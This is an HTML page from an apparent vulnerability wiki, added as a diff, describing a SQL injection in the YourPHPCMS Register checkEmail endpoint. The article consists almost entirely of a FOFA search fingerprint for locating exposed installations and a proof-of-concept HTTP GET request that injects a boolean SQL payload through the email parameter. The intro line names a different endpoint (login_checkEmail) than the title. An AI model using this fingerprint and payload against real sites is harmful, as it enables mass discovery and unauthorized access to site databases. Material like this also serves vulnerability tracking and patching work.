@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/YourPHPCMS/YourPHPCMS%E7%B3%BB%E7%BB%9FRegister_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>YourPHPCMS系统Register_checkEmail存在sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "YourPHPCMS\u7cfb\u7edfRegister_checkEmail\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../YourPHPCMS%E7%B3%BB%E7%BB%9Flogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../YourPHPCMS%E7%B3%BB%E7%BB%9Flogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YourPHPCMS系统login_checkEmail存在sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../YourPHP/YourPHPCMSlogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../YourPHP/YourPHPCMSlogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YourPHPCMS login_checkEmail存在sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="yourphpcmsregister_checkemailsql">YourPHPCMS系统Register_checkEmail存在sql注入漏洞<a class="headerlink" href="#yourphpcmsregister_checkemailsql" title="Permanent link">&para;</a></h1>
+<p>YourPHPCMS login_checkEmail存在sql注入漏洞</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="n">header</span><span class="o">=</span><span class="s">&quot;YP_onlineid&quot;</span>
+</code></pre></div>
+<p><img alt="" src="https://cdn.nlark.com/yuque/0/2024/png/29512878/1732274946081-2fa7b36f-5b27-464c-899e-b80b63981e17.png" /></p>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">g</span><span class="o">=</span><span class="n">User</span><span class="o">&amp;</span><span class="n">m</span><span class="o">=</span><span class="n">Register</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">checkEmail</span><span class="o">&amp;</span><span class="n">userid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=-</span><span class="mi">69710348</span><span class="o">@</span><span class="n">nwcrb</span><span class="p">.</span><span class="n">com</span><span class="o">&#39;+</span><span class="n">or</span><span class="o">+</span><span class="sc">&#39;1&#39;</span><span class="o">=&#39;</span><span class="mi">2</span><span class="s">&quot; HTTP/1.1</span>
+<span class="s">Host: </span>
+<span class="s">Accept: */*</span>
+<span class="s">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span>
+<span class="s">Accept-Encoding: gzip, deflate, br, zstd</span>
+</code></pre></div>
+<p><img alt="" src="https://cdn.nlark.com/yuque/0/2024/png/29512878/1732274798163-92c86972-4ab2-45b1-8ed0-efdd82c98664.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../YourPHPCMS%E7%B3%BB%E7%BB%9Flogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../YourPHPCMS%E7%B3%BB%E7%BB%9Flogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YourPHPCMS系统login_checkEmail存在sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../YourPHP/YourPHPCMSlogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../YourPHP/YourPHPCMSlogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YourPHPCMS login_checkEmail存在sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
